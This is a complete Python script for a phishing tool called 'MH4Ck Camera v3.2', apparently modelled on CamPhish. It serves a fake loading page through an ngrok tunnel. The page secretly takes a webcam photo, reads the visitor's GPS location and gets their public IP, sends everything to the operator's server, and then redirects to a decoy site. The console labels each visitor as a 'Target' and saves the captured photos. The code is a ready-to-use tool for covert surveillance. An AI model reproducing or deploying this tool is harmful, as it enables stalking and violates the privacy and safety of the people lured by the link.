#!/usr/bin/env python3
# ============================================================================
# MH4Ck Camera v3.2 - Direct CamPhish Ngrok Method
# Developer: @mengheang25
# From: Cambodia 🇰🇭
# ============================================================================

import os
import sys
import json
import time
import uuid
import base64
import threading
import urllib.parse
import requests
import subprocess
import signal
import atexit
import stat
import zipfile
import shutil
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
import logging
import socket

# ==================== បិទ Log Flask ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
os.environ['WERKZEUG_RUN_MAIN'] = 'true'

# ==================== Flask App ====================
app = Flask(__name__)

# ==================== អថេរសកល ====================
ngrok_process = None
ngrok_url = None
current_mode = "cam_location"
processed_clicks = set()
notification_lock = threading.Lock()
flask_port = 3333

# ==================== ពណ៌ ====================
class Colors:
    GREEN = '\033[1;92m'
    RED = '\033[1;91m'
    YELLOW = '\033[1;93m'
    BLUE = '\033[1;94m'
    PURPLE = '\033[1;95m'
    CYAN = '\033[1;96m'
    WHITE = '\033[1;97m'
    END = '\033[0m'

# ==================== HTML Templates (សាមញ្ញដូច CamPhish) ====================
CAM_LOCATION_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #1a1a1a; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .loading { display: inline-block; width: 40px; height: 40px; border: 4px solid #333; border-radius: 50%; border-top-color: #00ff00; animation: spin 1s infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Processing...</h2>
        <div class="loading"></div>
        <p>Please wait...</p>
    </div>
    <script>
    async function start() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height
        };
        
        // Location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(p => {
                info.location = { latitude: p.coords.latitude, longitude: p.coords.longitude };
                getCamera(info);
            }, e => { getCamera(info); });
        } else { getCamera(info); }
        
        async function getCamera(i) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                i.cameraAccess = true;
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                i.cameraPhoto = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { i.cameraAccess = false; }
            getIP(i);
        }
        
        async function getIP(i) {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                i.ipAddress = d.ip;
            } catch(e) { i.ipAddress = 'unknown'; }
            sendData(i);
        }
        
        function sendData(i) {
            fetch('/track/{{ track_id }}?mode={{ mode }}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(i)
            }).then(() => { window.location.href = '{{ redirect_url }}'; });
        }
    }
    window.onload = start;
    </script>
</body>
</html>"""

ONLY_LOCATION_HTML = CAM_LOCATION_HTML.replace('getCamera(info);', 'getIP(info);').replace(
    'async function getCamera(i) {', '/* Camera disabled */ async function getCamera(i) {'
).replace(
    """            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                i.cameraAccess = true;
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                i.cameraPhoto = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { i.cameraAccess = false; }""",
    'i.cameraAccess = false;'
)

BACK_CAMERA_HTML = CAM_LOCATION_HTML.replace('facingMode: "user"', 'facingMode: { exact: "environment" }')

FRONT_CAMERA_HTML = CAM_LOCATION_HTML

# ==================== ទាញយក Ngrok (ត្រង់ពី CamPhish) ====================
def download_ngrok():
    """ទាញយក ngrok តាមវិធី CamPhish"""
    ngrok_path = os.path.join(os.getcwd(), 'ngrok')
    
    if os.path.exists(ngrok_path):
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        return ngrok_path
    
    print(f"{Colors.YELLOW}[📥] Downloading Ngrok...{Colors.END}")
    
    arch = os.uname().machine
    arch2 = 'Android' if os.path.exists('/data/data/com.termux') else ''
    
    if 'arm' in arch or 'Android' in arch2:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
    elif 'aarch64' in arch:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
    else:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
    
    try:
        # ប្រើ wget ដូច CamPhish
        subprocess.run(['wget', '--no-check-certificate', '-O', 'ngrok.zip', url], 
                      check=True, timeout=60, capture_output=True)
        
        with zipfile.ZipFile('ngrok.zip', 'r') as zip_ref:
            zip_ref.extractall()
        
        os.remove('ngrok.zip')
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        
        print(f"{Colors.GREEN}[✅] Ngrok Downloaded!{Colors.END}")
        return ngrok_path
    except Exception as e:
        print(f"{Colors.RED}[❌] Download Error: {e}{Colors.END}")
        return None

# ==================== ចាប់ផ្តើម Ngrok (ដូច CamPhish) ====================
def start_ngrok(port=3333):
    """ចាប់ផ្តើម ngrok ដូច CamPhish"""
    global ngrok_process, ngrok_url
    
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return None
    
    stop_ngrok()
    
    try:
        print(f"{Colors.YELLOW}[🔄] Starting Ngrok...{Colors.END}")
        
        ngrok_process = subprocess.Popen(
            [ngrok_path, 'http', str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(5)
        
        # ទាញយក URL
        for i in range(10):
            try:
                r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
                if r.status_code == 200:
                    data = r.json()
                    for tunnel in data['tunnels']:
                        if tunnel['proto'] == 'https':
                            ngrok_url = tunnel['public_url']
                            print(f"{Colors.GREEN}[✅] Ngrok URL: {ngrok_url}{Colors.END}")
                            return ngrok_url
            except:
                pass
            time.sleep(1)
        
        print(f"{Colors.RED}[❌] Ngrok Failed!{Colors.END}")
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[❌] Error: {e}{Colors.END}")
        return None

def stop_ngrok():
    """បិទ ngrok ដូច CamPhish"""
    global ngrok_process
    if ngrok_process:
        try:
            ngrok_process.terminate()
        except:
            ngrok_process.kill()
        ngrok_process = None
    
    try:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    except:
        pass

# ==================== រក្សាទុករូបភាព ====================
def save_photo(track_id, photo_data, camera_type):
    """រក្សាទុករូបភាព"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"cam_{track_id}_{timestamp}_{camera_type}.png"
        
        if ',' in photo_data:
            photo_data = photo_data.split(',')[1]
        
        img_data = base64.b64decode(photo_data)
        
        with open(filename, 'wb') as f:
            f.write(img_data)
        
        print(f"{Colors.GREEN}   💾 Saved: {filename}{Colors.END}")
        return filename
    except Exception as e:
        print(f"{Colors.RED}   ❌ Save failed: {e}{Colors.END}")
        return None

# ==================== បង្ហាញ Notification ====================
def print_notification(track_id, data, mode):
    """បង្ហាញពេលមានអ្នកចុច link"""
    print(f"\n{Colors.RED}═══════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.YELLOW}🔔 Target Opened Link!{Colors.END}")
    print(f"{Colors.RED}═══════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}IP:{Colors.END} {data.get('ipAddress', 'N/A')}")
    
    if 'location' in data:
        lat = data['location']['latitude']
        lng = data['location']['longitude']
        print(f"{Colors.GREEN}Location:{Colors.END} {lat}, {lng}")
        print(f"{Colors.GREEN}Maps:{Colors.END} https://maps.google.com/?q={lat},{lng}")
    
    if 'cameraPhoto' in data:
        print(f"{Colors.PURPLE}Camera Photo Captured!{Colors.END}")
    
    print(f"{Colors.RED}═══════════════════════════════════════════════{Colors.END}\n")

# ==================== Flask Route ====================
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track_handler(track_id):
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://www.google.com')
        mode = request.args.get('mode', 'cam_location')
        
        if mode == 'cam_location':
            html = CAM_LOCATION_HTML
        elif mode == 'only_location':
            html = ONLY_LOCATION_HTML
        elif mode == 'back_camera':
            html = BACK_CAMERA_HTML
        else:
            html = FRONT_CAMERA_HTML
        
        return render_template_string(html, track_id=track_id, redirect_url=redirect_url, mode=mode)
    else:
        try:
            data = request.json
            data['ip_address'] = request.remote_addr
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            mode = request.args.get('mode', 'cam_location')
            
            click_id = f"{track_id}_{data.get('ipAddress', 'unknown')}"
            
            if click_id not in processed_clicks:
                print_notification(track_id, data, mode)
                processed_clicks.add(click_id)
                
                if 'cameraPhoto' in data and data['cameraPhoto']:
                    camera_type = request.args.get('mode', 'front')
                    save_photo(track_id, data['cameraPhoto'], camera_type)
            
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'success': False})

# ==================== មុខងារចម្បង (ដូច CamPhish 100%) ====================
def create_link(mode):
    """បង្កើត link ដូច CamPhish"""
    
    # 1. ទាញយក Ngrok
    ngrok_path = download_ngrok()
    if not ngrok_path:
        print(f"{Colors.RED}[❌] Cannot download Ngrok!{Colors.END}")
        return False
    
    # 2. សួររក Authtoken
    print(f"\n{Colors.YELLOW}[🔑] Enter Ngrok Authtoken:{Colors.END}")
    print(f"{Colors.CYAN}    Get from: https://dashboard.ngrok.com{Colors.END}")
    token = input(f"{Colors.YELLOW}    Authtoken: {Colors.END}").strip()
    
    if token:
        try:
            subprocess.run([ngrok_path, 'authtoken', token], 
                         capture_output=True, timeout=10)
            print(f"{Colors.GREEN}[✅] Authtoken set!{Colors.END}")
        except:
            pass
    
    # 3. សួររក URL គោលដៅ
    target = input(f"{Colors.YELLOW}[🎯] Redirect URL (Enter=Google): {Colors.END}").strip()
    if not target:
        target = "https://www.google.com"
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # 4. ចាប់ផ្តើម Flask
    print(f"{Colors.YELLOW}[🔄] Starting PHP server...{Colors.END}")
    
    def run_flask():
        app.run(host='0.0.0.0', port=3333, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print(f"{Colors.GREEN}[✅] PHP server running on port 3333{Colors.END}")
    time.sleep(3)
    
    # 5. ចាប់ផ្តើម Ngrok
    ngrok_url = start_ngrok(3333)
    if not ngrok_url:
        print(f"{Colors.RED}[❌] Ngrok failed!{Colors.END}")
        return False
    
    # 6. បង្កើត Track ID
    track_id = str(uuid.uuid4())[:6]
    
    # 7. បង្កើត Link
    link = f"{ngrok_url}/track/{track_id}?url={urllib.parse.quote(target)}&mode={mode}"
    
    # 8. បង្ហាញ Link
    print(f"\n{Colors.GREEN}═══════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.GREEN}✅ LINK GENERATED!{Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}Mode:{Colors.END} {mode}")
    print(f"{Colors.CYAN}Track ID:{Colors.END} {track_id}")
    print(f"{Colors.CYAN}Link:{Colors.END}")
    print(f"{Colors.UNDERLINE}{link}{Colors.END}")
    print(f"\n{Colors.YELLOW}[⚠️] Waiting for target... (Ctrl+C to stop){Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════{Colors.END}\n")
    
    return True

def show_banner():
    os.system('clear')
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════╗
║     MH4Ck Camera v3.2 - CamPhish Style     ║
║         Developer: @mengheang25            ║
║              From: Cambodia 🇰🇭             ║
╚══════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def show_menu():
    menu = f"""
{Colors.CYAN}╔══════════════════════════════════════════════╗
║              MAIN MENU                     ║
╠══════════════════════════════════════════════╣
║  {Colors.GREEN}[1]{Colors.CYAN} Camera + Location                      ║
║  {Colors.GREEN}[2]{Colors.CYAN} Only Location                         ║
║  {Colors.GREEN}[3]{Colors.CYAN} Back Camera                           ║
║  {Colors.GREEN}[4]{Colors.CYAN} Front Camera                          ║
║  {Colors.GREEN}[5]{Colors.CYAN} Exit                                 ║
╚══════════════════════════════════════════════╝{Colors.END}
"""
    print(menu)

def main():
    atexit.register(stop_ngrok)
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    
    while True:
        try:
            show_banner()
            show_menu()
            
            choice = input(f"{Colors.YELLOW}Select option: {Colors.END}").strip()
            
            if choice == '1':
                create_link('cam_location')
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                stop_ngrok()
            elif choice == '2':
                create_link('only_location')
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                stop_ngrok()
            elif choice == '3':
                create_link('back_camera')
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                stop_ngrok()
            elif choice == '4':
                create_link('front_camera')
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                stop_ngrok()
            elif choice == '5':
                print(f"{Colors.YELLOW}Goodbye!{Colors.END}")
                stop_ngrok()
                sys.exit(0)
            else:
                print(f"{Colors.RED}Invalid option!{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
            stop_ngrok()
            sys.exit(0)

if __name__ == '__main__':
    main()
